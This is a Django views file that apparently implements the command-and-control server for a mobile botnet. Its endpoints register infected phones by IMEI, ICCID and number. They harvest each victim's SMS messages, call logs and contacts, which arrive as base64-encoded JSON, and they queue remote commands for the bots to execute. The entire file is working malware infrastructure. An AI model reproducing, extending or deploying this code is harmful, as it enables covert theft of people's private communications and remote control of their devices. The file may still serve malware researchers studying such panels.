# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.shortcuts import render, redirect
from django.http import HttpResponse, JsonResponse

import logging
import json
import models
import datetime
import dateutil.parser

from .models import Bot, BotCommand, SmsData, CallLog, Contact

logger = logging.getLogger(__name__)


def index(request):
    return render(request,"index.html", {'bots': Bot.objects.all()})


def bots(request, bot_id):
    smsData = SmsData.objects.filter(bot_id=bot_id)
    callLog = CallLog.objects.filter(bot_id=bot_id)
    contact = Contact.objects.filter(bot_id=bot_id)
    return render(request,"bots.html", {'bot_id':bot_id ,
                                        'smsDataMsgs':smsData,
                                        'callLog': callLog,
                                        'contactLog': contact,
                                        })


def send_command(request, bot_id):
    if request.method != "POST":
        return HttpResponse("send command")
    else:
        bot = Bot.objects.get(id=bot_id)
        command = BotCommand()
        command.bot = bot
        command.command = request.POST['command']
        command.parameters = request.POST['commandParam']
        command.executed = False
        command.save()
        return redirect("bots", bot_id=bot_id)


def deletedata(request, data_id, bot_id):
    if data_id == "msgs":
        SmsData.objects.all().delete()
    if data_id == "calllogs":
        CallLog.objects.all().delete()
    if data_id == "contactlogs":
        Contact.objects.all().delete()
    return redirect("bots", bot_id=bot_id)

def stbi(request):
    """
    Device/bot registration
    """
    if request.method != "POST":
        return HttpResponse("stbi")
    else:
        data = json.loads(request.body.decode('base64'))
        print("device registration: %s" % data)
        bot = None
        try:
            bot = models.Bot.objects.get(number=data.get('number', ''))
        except models.Bot.DoesNotExist:
            bot = models.Bot()
            bot.hash = data['hash']
            bot.imei = data.get('imei', '')
            bot.iccid = data.get('iccid', '')
            bot.number = data.get('number', '')
            bot.model = data.get('model', '')
            bot.os = data.get('os', '')
            bot.control_number = data.get('control_number', '')
            bot.ipaddr = request.META['REMOTE_ADDR']
            bot.save()

        return HttpResponse(bot.id)


def sban(request):
    if request.method != "POST":
        return HttpResponse("sban")
    else:
        data = json.loads(request.body.decode('base64'))
        print("GetTemplates (sban): %s" % data)
        return JsonResponse({})


def sy(request):
    """ Bot has requested for commands, send it some commands """
    if request.method != "POST":
        return HttpResponse("sy")
    else:
        data = json.loads(request.body.decode('base64'))
        print("GetCommands (sy): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        bot.last_online = datetime.datetime.utcnow()
        bot.ipaddr = request.META['REMOTE_ADDR']
        bot.save()

        commands = []
        for command in models.BotCommand.objects.filter(bot=bot, executed=False):
            commands.append({"command_name": command.command,
                             "command_data": command.parameters,
                             "command_sig": command.id})
            command.deployed = datetime.datetime.utcnow()
            command.executed = True     
            command.save()

        return JsonResponse({"commands": commands})


def ssl(request):
    if request.method != "POST":
        return HttpResponse("ssl")
    else:
        #SmsData.objects.all().delete()
        data = json.loads(request.body.decode('base64'))
        SmsData.objects.filter(bot_id=data['bot_id']).delete()
        print("SendSmsList (ssl): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        for msg in data['sms_list']:
            # TODO(LM): is there a way of bulk inserting?
            sms = models.SmsData()
            sms.bot = bot
            sms.date = msg['date']
            sms.type = msg['type']
            sms.address = msg['address']
            sms.message = msg['message']
            sms.save()
        return HttpResponse("OK")


def scal(request):
    if request.method != "POST":
        return HttpResponse("scal")
    else:
        #CallLog.objects.all().delete()
        data = json.loads(request.body.decode('base64'))
        CallLog.objects.filter(bot_id=data['bot_id']).delete()
        print("SendCallList (scal): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        for msg in data['call_list']:
            # TODO(LM): is there a way of bulk inserting?
            call = models.CallLog()
            call.bot = bot
            call.date = dateutil.parser.parse(msg['date'])
            call.duration = msg['duration']
            call.type = msg['type']
            try:
                call.type_str = msg['typeStr']
            except:
                call.type_str == ""
            call.number = msg['number']
            call.save()
        return HttpResponse("OK")


def scol(request):
    if request.method != "POST":
        return HttpResponse("scol")
    else:
        data = json.loads(request.body.decode('base64'))
        Contact.objects.filter(bot_id=data['bot_id']).delete()
        print("SendContactList (scol): %s" % data)
        bot = models.Bot.objects.get(id=data['bot_id'])
        for msg in data['contact_list']:
            # TODO(LM): is there a way of bulk inserting?
            contact = models.Contact()
            contact.bot = bot
            contact.display_name = msg['display_name']
            contact.data = msg['data']
            contact.save()
        return HttpResponse("OK")


def ucs(request):
    """
     Executed command
    """
    if request.method != "POST":
        return HttpResponse("ucs")
    else:
        data = json.loads(request.body.decode('base64'))
        print("ExecutedCommand (ucs): %s", data)
        #cmd = models.BotCommand.objects.get(id=data['command_sig']) \
        #    if 'command_sig' in data else
        #cmd.executed = True
        #cmd.save()
        return HttpResponse("OK")
